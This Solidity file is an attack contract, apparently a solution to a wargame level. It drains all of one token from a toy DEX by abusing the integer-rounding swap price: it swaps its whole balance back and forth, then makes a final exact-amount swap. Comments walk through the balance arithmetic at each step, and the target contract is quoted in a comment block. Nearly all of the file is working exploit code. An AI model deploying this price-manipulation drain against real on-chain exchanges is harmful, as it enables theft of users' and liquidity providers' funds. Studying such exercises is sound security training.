// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

interface IDex {
    function token1() external view returns (address);
    function token2() external view returns (address);
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
    function swap(address from, address to, uint256 amount) external;
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
}

contract DexHack {
    IDex private immutable dex;
    IERC20 private immutable token1;
    IERC20 private immutable token2;

    constructor(IDex _dexAddress) {
        dex = _dexAddress;
        token1 = IERC20(dex.token1());
        token2 = IERC20(dex.token2());
    }

    function attack() external {
        token1.transferFrom(msg.sender, address(this), 10);
        token2.transferFrom(msg.sender, address(this), 10);

        token1.approve(address(dex), type(uint256).max);
        token2.approve(address(dex), type(uint256).max);

        // swapAmount = return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
        // swapAmount = (amountIn * toTokenBalance) / fromTokenBalance
        // Our `swapAll` function swaps ALL our balance of the tokenIn.

        // swapAmount = (10 * 100) / 100 = 10 token2 received.
        // Result ==> Player:(0 token1, 20 token2) Dex:(110 token1, 90 token2).
        swapAll(token1, token2); 

        // swapAmount = (20 * 110) / 90 = 24 token1 received.
        // Result ==> Player:(24 token1, 0 token2) Dex:(86 token1, 110 token2)
        swapAll(token2, token1);

        // swapAmount = (24 * 110) / 86 = 30 token2 received.
        // Result ==> Player:(0 token1, 30 token2) Dex:(110 token1, 80 token2)
        swapAll(token1, token2);

        // swapAmount = (30 * 110) / 80 = 41 token1 received.
        // Result ==> Player:(41 token1, 0 token2) Dex:(69 token1, 110 token2)
        swapAll(token2, token1); 

        // swapAmount = (41 * 110) / 69 = 65 token2 received.
        // Result ==> Player:(0 token1, 65 token2) Dex:(110 token1, 45 token2)
        swapAll(token1, token2);

        // swapAmount = (amountIn * toTokenBalance) / fromTokenBalance
        // 110 = (amountIn * 110) / 45  ==> amountIn = 45 token2 needed for last swap.
        // Calls the DEX `swap` function, where we specify exact amount to get all of token1.
        dex.swap(address(token2), address(token1), 45); 

        require(token1.balanceOf(address(dex)) == 0, "dex token1 balance != 0");
    }

    function swapAll(IERC20 tokenIn, IERC20 tokenOut) private {
        // Always swaps for entire tokenIn balance.
        dex.swap(address(tokenIn), address(tokenOut), tokenIn.balanceOf(address(this)));
    }
}



/*
// Target Contract
import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import 'openzeppelin-contracts-08/access/Ownable.sol';

contract Dex is Ownable {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }
  
  function addLiquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }
  
  function swap(address from, address to, uint amount) public {
    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapPrice(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableToken(token1).approve(msg.sender, spender, amount);
    SwappableToken(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableToken is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}
*/